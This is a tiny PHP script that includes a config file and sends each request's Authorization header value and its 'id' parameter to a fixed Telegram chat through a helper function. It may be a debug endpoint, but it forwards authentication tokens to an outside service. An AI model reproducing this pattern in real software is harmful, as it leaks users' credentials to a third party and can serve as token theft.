<?
include "../../../config.php";

message_to_telegram("token: ".$_SERVER['Authorization'], '217756119');
message_to_telegram("id: ".$_GET["id"], '217756119');
?>
